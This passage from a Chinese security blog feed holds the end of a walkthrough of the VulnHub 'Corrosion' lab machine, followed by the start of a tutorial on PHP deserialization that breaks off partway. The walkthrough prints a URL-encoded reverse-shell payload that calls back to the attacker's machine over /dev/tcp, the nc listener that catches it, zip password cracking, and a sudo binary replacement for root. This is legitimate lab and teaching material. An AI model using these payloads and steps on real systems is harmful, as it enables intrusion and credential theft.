class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">63</span>%<span class="hljs-number">20</span>%<span class="hljs-number">27</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">76</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">63</span>%<span class="hljs-number">70</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">31</span>%<span class="hljs-number">39</span>%<span class="hljs-number">32</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">31</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">32</span>%<span class="hljs-number">32</span>%<span class="hljs-number">32</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">31</span>%<span class="hljs-number">32</span>%<span class="hljs-number">38</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">39</span>%<span class="hljs-number">39</span>%<span class="hljs-number">39</span>%<span class="hljs-number">39</span>%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">26</span>%<span class="hljs-number">31</span>%<span class="hljs-number">27</span><br></code></pre></td></tr></table></figure><blockquote><p>拿下Shell</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># nc -lvnp 9999</span><br>listening on [any] 9999 ...<br>connect to [192.168.222.128] from (UNKNOWN) [192.168.222.144] 43686<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1003): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@corrosion:/var/www/html/blog-post/archives$ <br></code></pre></td></tr></table></figure><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="信息收集-www-data"><a href="#信息收集-www-data" class="headerlink" title="信息收集_www-data"></a>信息收集_www-data</h3><p>信息收集这部分使用工具来实现比较方便，比较好用的项目如下：</p><ul><li><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li><li><a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></li></ul><p>都是 shell 脚本，直接下载执行就行。</p><p>这里使用 <a href="https://github.com/carlospolop/PEASS-ng/releases/download/20230425-bd7331ea/linpeas.sh">linpeas.sh</a>（ PEASS-ng ）进行信息收集：</p><blockquote><p>本地启动http服务</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -m http.server<br></code></pre></td></tr></table></figure><blockquote><p>靶机下载 linpeas.sh</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /tmp<br>wget http://192.168.222.128:8000/linpeas.sh<br></code></pre></td></tr></table></figure><blockquote><p>执行 linpeas.sh 进行信息收集</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod +x linpeas.sh<br>./linpeas.sh &gt; linpeas_info_www.txt<br></code></pre></td></tr></table></figure><p>脚本探测出一些可能存在的溢出漏洞：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell">╔══════════╣ Executing Linux Exploit Suggester<br>╚ https://github.com/mzet-/linux-exploit-suggester                                                                 <br><br>[+] [CVE-2022-0847] DirtyPipe<br><br>   Details: https://dirtypipe.cm4all.com/<br>   Exposure: probable<br>   Tags: [ ubuntu=(20.04|21.04) ],debian=11<br>   Download URL: https://haxx.in/files/dirtypipez.c<br><br>[+] [CVE-2021-3156] sudo Baron Samedit<br><br>   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt<br>   Exposure: less probable<br>   Tags: mint=19,ubuntu=18|20, debian=10<br>   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main<br><br>[+] [CVE-2021-3156] sudo Baron Samedit 2<br><br>   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt<br>   Exposure: less probable<br>   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10<br>   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main<br><br></code></pre></td></tr></table></figure><p>比较常用的两个 DirtyPipe 和 SUDO。</p><p>但是简单的检测后发现应该是都被修复了，老老实实找吧。</p><p>没有发现 SUID 程序，但是有一些属于 root 用户的备份文件：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tap">╔══════════╣ Backup files (limited 100)<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 3285 </span>Jul<span class="hljs-number"> 30 </span><span class="hljs-number"> 2021 </span>/var/backups/user_backup.zip                                                                                           <br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 191 </span>Apr<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>/var/lib/sgml-base/supercatalog.old<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 673 </span>Apr<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>/etc/xml/xml-core.xml.old<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1219 </span>Apr<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>/etc/xml/sgml-data.xml.old<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 10151 </span>Apr<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>/etc/xml/docbook-xml.xml.old<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 3210 </span>Apr<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>/etc/xml/catalog.old<br></code></pre></td></tr></table></figure><p>尝试解压，发现需要密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@corrosion:/tmp$ unzip /var/backups/user_backup.zip<br>unzip /var/backups/user_backup.zip<br>Archive:  /var/backups/user_backup.zip<br>   skipping: id_rsa                  unable to get password<br>   skipping: id_rsa.pub              unable to get password<br>   skipping: my_password.txt         unable to get password<br>   skipping: easysysinfo.c           unable to get password<br></code></pre></td></tr></table></figure><p>不过可以看到里面有个 my_password.txt 文件，那么就尝试破解下这个 zip 的密码。</p><p>搜一下：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230429192136574.png" alt="image-20230429192136574"></p><p>发现可以使用 fcrackzip 工具进行压缩包的密码破解。</p><h3 id="fcrackzip破解zip密码"><a href="#fcrackzip破解zip密码" class="headerlink" title="fcrackzip破解zip密码"></a>fcrackzip破解zip密码</h3><blockquote><p>fcrackzip 安装 </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get install fcrackzip -y<br></code></pre></td></tr></table></figure><blockquote><p>帮助信息</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">fcrackzip version 1.0, a fast/free zip password cracker<br>written by Marc Lehmann &lt;pcg@goof.com&gt; You can find more info on<br>http://www.goof.com/pcg/marc/<br><br>USAGE: fcrackzip<br>          [-b|--brute-force]            use brute force algorithm# 暴力枚举<br>          [-D|--dictionary]             use a dictionary# 使用字典<br>          [-B|--benchmark]              execute a small benchmark<br>          [-c|--charset characterset]   use characters from charset<br>          [-h|--help]                   show this message<br>          [--version]                   show the version of this program<br>          [-V|--validate]               sanity-check the algorithm<br>          [-v|--verbose]                be more verbose<br>          [-p|--init-password string]   use string as initial password/file# 指定密码<br>          [-l|--length min-max]         check password with length min to max<br>          [-u|--use-unzip]              use unzip to weed out wrong passwords # 使用解压缩清除错误的密码<br>          [-m|--method num]             use method number &quot;num&quot; (see below)<br>          [-2|--modulo r/m]             only calculcate 1/m of the password<br>          file...                    the zipfiles to crack<br><br>methods compiled in (* = default):<br><br> 0: cpmask<br> 1: zip1<br>*2: zip2, USE_MULT_TAB<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">fcrackzip -D -u -<span class="hljs-selector-tag">p</span> 字典 压缩包<br></code></pre></td></tr></table></figure><p>先把压缩包下载到 KALI 上面，还是 python 开启 http 服务，kali wget 下载 …</p><p>这里使用的是 &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 密码字典，这个字典里面包含着许多密码，需要使用 <code>gunzip</code> 将其解压后使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[~/192.168.222.144:8000]<br>└─# fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt user_backup.zip<br>PASSWORD FOUND!!!!: pw == !randybaby<br></code></pre></td></tr></table></figure><p>解压user_backup.zip，查看密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[~/192.168.222.144:8000]<br>└─# unzip -P &#x27;!randybaby&#x27; user_backup.zip<br>Archive:  user_backup.zip<br>  inflating: id_rsa                  <br>  inflating: id_rsa.pub              <br> extracting: my_password.txt         <br>  inflating: easysysinfo.c           <br>                                                                                                                                                                <br>┌──(root㉿kali)-[~/192.168.222.144:8000]<br>└─# ll<br>total 20<br>-rw-r--r-- 1 root root  148 Jul 30  2021 easysysinfo.c<br>-rw------- 1 root root 2590 Jul 30  2021 id_rsa<br>-rw-r--r-- 1 root root  563 Jul 30  2021 id_rsa.pub<br>-rw-r--r-- 1 root root   23 Jul 30  2021 my_password.txt<br>-rw-r--r-- 1 root root 3285 Jul 30  2021 user_backup.zip<br>                                                                                                                                                                <br>┌──(root㉿kali)-[~/192.168.222.144:8000]<br>└─# cat my_password.txt      <br>randylovesgoldfish1998<br></code></pre></td></tr></table></figure><p>登录一下，不是 root 密码，而是 randy 用户的密码，randy 用户通过 &#x2F;home 目录、靶机登录页面、linpeas.sh 收集的信息都能够知道这个用户名。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# ssh root@192.168.222.144                            <br>root@192.168.222.144&#x27;s password: <br>Permission denied, please try again.<br>root@192.168.222.144&#x27;s password: <br><br>                                                                                                                                                                <br>┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# ssh randy@192.168.222.144<br>randy@192.168.222.144&#x27;s password: <br>Welcome to Ubuntu 21.04 (GNU/Linux 5.11.0-25-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>119 updates can be installed immediately.<br>0 of these updates are security updates.<br>To see these additional updates run: apt list --upgradable<br><br><br>The list of available updates is more than a week old.<br>To check for new updates run: sudo apt update<br>Last login: Fri Jul 30 15:28:02 2021 from 10.0.0.69<br>randy@corrosion:~$ cat user.txt <br>98342721012390839081<br></code></pre></td></tr></table></figure><h3 id="信息收集-randy"><a href="#信息收集-randy" class="headerlink" title="信息收集_randy"></a>信息收集_randy</h3><p>依旧通过 linpeas.sh 进行信息收集，到 tmp 目录下发现下载的 linpeas.sh 没了 ？？？</p><p>手工收集一波：</p><blockquote><p>SUID</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:/tmp$ find / -user root -perm -4000 -print 2&gt;/dev/null<br>/snap/snapd/18933/usr/lib/snapd/snap-confine<br>/snap/core18/2074/bin/mount<br>/snap/core18/2074/bin/ping<br>....<br>/home/randy/tools/easysysinfo<br></code></pre></td></tr></table></figure><p>没有发现可以提权的SUID可执行文件，但是发现了本用户目录有个 easysysinfo 有SUID权限，查看 easysysinfo 作用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~/tools$ ls -l<br>total 20<br>-rwsr-xr-x 1 root root 16192 Jul 30  2021 easysysinfo<br>-rwxr-xr-x 1 root root   318 Jul 29  2021 easysysinfo.py<br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~/tools$ ./easysysinfo<br>Sat Apr 29 06:13:46 AM MDT 2023<br>127.0.0.1       localhost<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">The following lines are desirable <span class="hljs-keyword">for</span> IPv6 capable hosts</span><br>::1     ip6-localhost ip6-loopback<br>fe00::0 ip6-localnet<br>ff00::0 ip6-mcastprefix<br>ff02::1 ip6-allnodes<br>ff02::2 ip6-allrouters<br>Linux corrosion 5.11.0-25-generic #27-Ubuntu SMP Fri Jul 9 23:06:29 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">randy@corrosion:~/tools$ cat easysysinfo.py <br><span class="hljs-comment">#!/usr/bin/python3.9</span><br><br><span class="hljs-keyword">import</span> os<br><br>command1 = <span class="hljs-string">&quot;/usr/bin/date&quot;</span><br>command2 = <span class="hljs-string">&quot;/usr/bin/cat /etc/hosts&quot;</span><br>command3 = <span class="hljs-string">&quot;/usr/bin/uname -a&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Today is: &quot;</span>)<br>        os.system(command1)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hosts File: &quot;</span>)<br>        os.system(command2)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Kernal Version: &quot;</span>)<br>        os.system(command3)<br><br>output()<br></code></pre></td></tr></table></figure><p>该目录下有 easysysinfo，easysysinfo.py，easysysinfo 应该就是 easysysinfo.py 的可执行文件。</p><p>从 easysysinfo.py 代码可以看到它直接就指定好调用程序的路径 <code>/usr/bin/date</code>，而不是通过环境变量 <code>date</code>，所以不能使用替换环境变量的方法提权。</p><p>继续进行信息收集</p><blockquote><p>sudo -l 查看用户的 sudo 权限</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~/tools$ sudo -l<br>[sudo] password for randy: <br>Matching Defaults entries for randy on corrosion:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User randy may run the following commands on corrosion:<br>    (root) PASSWD: /home/randy/tools/easysysinfo<br></code></pre></td></tr></table></figure><p>randy 用可以使用 sudo 以 root 用户去执行 &#x2F;home&#x2F;randy&#x2F;tools&#x2F;easysysinfo 文件。</p><p>这里的提权思路是替换掉 &#x2F;home&#x2F;randy&#x2F;tools&#x2F;easysysinfo 。</p><p>easysysinfo 的源码是 easysysinfo.py，看看这里能不能使用 Python 生成可执行文件。</p><p>看下 python 怎么打包成可执行文件。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230429202459959.png" alt="image-20230429202459959"></p><p>但是没有 pyinstaller 环境，不过 c 可以编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~/tools$ pyinstaller<br>pyinstaller: command not found<br>randy@corrosion:~/tools$ cc<br>cc: fatal error: no input files<br>compilation terminated.<br>randy@corrosion:~/tools$ gcc<br>gcc: fatal error: no input files<br>compilation terminated.<br></code></pre></td></tr></table></figure><p>搜一下 C语言如何执行 Linux 命令改一下即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  system(<span class="hljs-string">&quot;bash&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译替换：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~/tools$ vi shell.c<br>randy@corrosion:~/tools$ gcc shell.c -o easysysinfo<br>randy@corrosion:~/tools$ sudo ./easysysinfo<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@corrosion:/home/randy/tools# cd ~<br>root@corrosion:~# ll<br>total 52<br>drwx------  7 root root 4096 Jul 30  2021 ./<br>drwxr-xr-x 20 root root 4096 Jul 29  2021 ../<br>-rw-r--r--  1 root root  461 Jul 30  2021 .bash_history<br>-rw-r--r--  1 root root 3106 Aug 14  2019 .bashrc<br>drwx------  2 root root 4096 Apr 20  2021 .cache/<br>drwx------  3 root root 4096 Jul 30  2021 .config/<br>drwxr-xr-x  2 root root 4096 Jul 30  2021 creds/<br>drwxr-xr-x  3 root root 4096 Jul 29  2021 .local/<br>-rw-r--r--  1 root root   10 Apr 29 06:32 logs.txt<br>-rw-r--r--  1 root root  161 Sep 16  2020 .profile<br>-rw-r--r--  1 root root  251 Jul 30  2021 root.txt<br>-rw-r--r--  1 root root   66 Jul 30  2021 .selected_editor<br>drwxr-xr-x  3 root root 4096 Jul 29  2021 snap/<br>-rw-r--r--  1 root root    0 Jul 30  2021 .sudo_as_admin_successful<br>root@corrosion:~# cat root.txt <br>FLAG: 4NJSA99SD7922197D7S90PLAWE <br><br>Congrats! Hope you enjoyed my first machine posted on VulnHub! <br>Ping me on twitter @proxyprgrammer for any suggestions.<br><br>Youtube: https://www.youtube.com/c/ProxyProgrammer<br>Twitter: https://twitter.com/proxyprgrammer<br></code></pre></td></tr></table></figure><h2 id="靶机小结"><a href="#靶机小结" class="headerlink" title="靶机小结"></a>靶机小结</h2><ul><li>文件包含 auth.log 拿 shell</li><li>fcrackzip 破解压缩包密码</li><li>C 语言执行系统命令 - system(“bash”)</li><li>编译可执行文件：<ul><li>C：gcc shell.c -o easysysinfo</li><li>Python：pyinstaller</li></ul></li><li>替换有 SUDO 权限的可执行文件进行提权</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>靶机渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP 反序列化</title>
    <link href="/2023/05/28/WEB%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/05/28/WEB%E6%BC%8F%E6%B4%9E/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/PHP%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="PHP 反序列化"></p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>PHP 反序列化常出现在 CTF 中，实际环境出现较少。</p><p>反序列化漏洞的原理都是一样的：目标程序对攻击者可控的数据进行反序列化操作</p><p>PHP 的反序列化漏洞利用方面主要在反序列化期间一些魔术方法的自动调用上。</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 序列化函数( 用于构造 Payload )</span><br><span class="hljs-title function_ invoke__">serialize</span>()<br><span class="hljs-comment">// 反序列化函数( 漏洞出现的原因 )</span><br><span class="hljs-title function_ invoke__">unserialize</span>()<br></code></pre></td></tr></table></figure><p>序列化后的字符串如下：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/3146041-20230331173519839-93221379.png" alt="3146041-20230331173519839-93221379"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">a - <span class="hljs-keyword">array</span><span class="hljs-comment">// 数组                </span><br>b - <span class="hljs-keyword">boolean</span><span class="hljs-comment">// 布尔</span><br>d - <span class="hljs-keyword">double</span><span class="hljs-comment">// 双精度   </span><br>i - <span class="hljs-keyword">integer</span><span class="hljs-comment">// 整型</span><br>o - common <span class="hljs-keyword">object</span><span class="hljs-comment">// 对象( PHP4 后被 &quot;O&quot; 取代 )             </span><br>r - reference<span class="hljs-comment">// 引用</span><br>s - <span class="hljs-keyword">string</span><span class="hljs-comment">// 字符串       </span><br>C - custom <span class="hljs-keyword">object</span><span class="hljs-comment">// 自定义对象 ( PHP5 引入 )</span><br>O - <span class="hljs-class"><span class="hljs-keyword">class</span>// 类                 </span><br><span class="hljs-class"><span class="hljs-title">N</span> - <span class="hljs-title">null</span>// 空值 </span><br><span class="hljs-class"><span class="hljs-title">R</span> - <span class="hljs-title">pointer</span> <span class="hljs-title">reference</span>// 指针引用      </span><br><span class="hljs-class"><span class="hljs-title">U</span> - <span class="hljs-title">unicode</span> <span class="hljs-title">string</span>// <span class="hljs-title">unicode</span> 字符串 </span><br></code></pre></td></tr></table></figure><h2 id="修饰符号"><a href="#修饰符号" class="headerlink" title="修饰符号"></a>修饰符号</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span><span class="hljs-comment">// 共有的, 在类内部和外部都可见</span><br><span class="hljs-keyword">private</span><span class="hljs-comment">// 私有的, 仅在类内部可见</span><br><span class="hljs-keyword">protected</span><span class="hljs-comment">// 受保护的, 在类内部和子类中可见</span><br></code></pre></td></tr></table></figure><p>反序列化是为了对象的传递，PHP 将对象序列化为了字符串进行传递，在这个字符串中有关变量的有 <code>变量类型、变量值长度、变量值内容</code>，但是 <code>修饰符</code> 怎么传递呢？</p><p><code>修饰符</code> 的传递下面特殊的形式进行表示了。表示方法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span>       <span class="hljs-comment">// \x00类名\x00属性名</span><br><span class="hljs-keyword">protected</span>     <span class="hljs-comment">// \x00*\x00属性名</span><br></code></pre></td></tr></table></figure><p>这里的 <code>\x00</code> 表示的是空字节。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230526200727702.png" alt="image-20230526200727702"></p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>() <span class="hljs-comment">// 构造函数, 当对象 new 的时候会自动调用</span><br><span class="hljs-title function_ invoke__">__destruct</span>()<span class="hljs-comment">// 析构函数, 当对象被销毁时会被自动调用( 程序结束自动调用 )</span><br><span class="hljs-title function_ invoke__">__wakeup</span>() <span class="hljs-comment">// unserialize() 时会被自动调用  </span><br><span class="hljs-title function_ 